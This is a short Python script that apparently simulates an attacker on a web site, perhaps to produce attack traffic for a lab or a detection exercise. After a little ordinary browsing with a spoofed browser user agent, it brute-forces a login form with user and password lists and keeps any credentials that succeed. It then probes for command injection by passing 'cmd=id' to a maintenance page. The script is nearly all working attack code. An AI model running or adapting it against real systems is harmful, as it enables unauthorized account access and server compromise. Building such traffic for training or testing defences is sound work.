#!/usr/bin/env python3
import requests
import random
from icecream import ic
from time import sleep

# setup stuff
URLs = open("urls.txt","r").readlines()
userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.37) Gecko/20100101 Firefox/12.0"
header = {'User-Agent': userAgent}

# wait for the site to come online
sitesUp = False
while not sitesUp == 200:
    try:
        ic(sitesUp)
        req = requests.get(URLs[0].strip())
        sitesUp = req.status_code
        sleep(5)
    except Exception as ex:
        ic(ex)

# give normal traffic a minute
sleep(60)

# browse a bit
for i in range(2):
    try:
        req = requests.get(random.choice(URLs).strip(), headers=header)
    except Exception as ex:
        ic(ex)
    sleep(random.randint(1,5))

# attack the login
goodCreds = []
for user in open("users.txt","r").readlines():
    for password in open("passwords.txt","r").readlines():
        payload = {'username': user,'password':password}
        attempt = requests.post('http://www.toteslegit.us/login.html', headers=header, data=payload)
        if attempt.cookies.list_paths() != []:
            goodCreds.append(payload)

# check out command injection
try:
    req = requests.get(URLs[0].strip() + "maintenance.html?cmd=id", headers=header)
except Exception as ex:
    ic(ex)

